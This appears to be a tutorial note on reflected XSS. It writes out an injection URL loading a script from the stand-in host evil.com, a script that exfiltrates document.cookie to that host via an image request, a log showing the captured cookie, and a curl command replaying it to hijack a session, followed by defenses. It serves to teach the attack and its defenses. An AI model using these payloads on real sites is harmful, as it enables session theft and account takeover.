# 05 - Reflected XSS: Cookie Theft via Injected Script

## The Attack Chain

### Step 1: Inject a Remote Script via URL Parameter

The attacker crafts a URL with a malicious payload in a query parameter:

```
http://www.a.com/test.htm?abc="><script src=http://www.evil.com/evil.js></script>
```

If the server reflects `abc` into the page without sanitization, e.g.:

```html
<input type="text" value="[abc]" />
```

The rendered HTML becomes:

```html
<input type="text" value=""><script src=http://www.evil.com/evil.js></script>" />
```

The `">` closes the `value` attribute and the `<input>` tag, then the attacker's external script loads.

### Step 2: The Malicious Script (`evil.js`) Steals Cookies

```javascript
var img = document.createElement("img");
img.src = "http://www.evil.com/log?" + escape(document.cookie);
document.body.appendChild(img);
```

This creates an `<img>` tag with the victim's cookies encoded in the URL. The browser sends a GET request to `evil.com` to "load the image" — delivering the cookies to the attacker's server.

Why use `<img>` instead of `fetch` or `XMLHttpRequest`:
- No CORS restrictions — image requests are always allowed cross-origin
- No JavaScript errors — the request fires silently even if the response isn't an image
- Works in all browsers, including very old ones

### Step 3: Attacker's Server Logs the Cookies

```
127.0.0.1 - - [19/Jul/2010:11:30:42 +0800] "GET /log?cookie1%3D1234 HTTP/1.1" 404 288
```

The access log shows the stolen cookie: `cookie1=1234` (URL-encoded as `cookie1%3D1234`). The 404 response doesn't matter — the data was already captured in the log.

### Step 4: Session Hijacking

The attacker now uses the stolen cookie to impersonate the victim:

```bash
curl http://www.a.com/account \
  -H "Cookie: cookie1=1234"
```

## Full Attack Flow

```
Victim clicks:
  http://www.a.com/test.htm?abc="><script src=http://evil.com/evil.js></script>
       │
       ▼
a.com reflects the parameter into HTML
       │
       ▼
Browser loads evil.js from evil.com
       │
       ▼
evil.js creates <img src="http://evil.com/log?cookie1%3D1234">
       │
       ▼
evil.com access log captures the cookie
       │
       ▼
Attacker uses cookie to hijack session
```

## Defenses

- `HttpOnly` flag on cookies — prevents `document.cookie` from accessing them
- Output encoding — HTML-encode reflected parameters (`"` → `&quot;`, `<` → `&lt;`)
- Content Security Policy — `script-src 'self'` blocks loading scripts from `evil.com`
- Input validation — reject or strip `<`, `>`, `"` from URL parameters
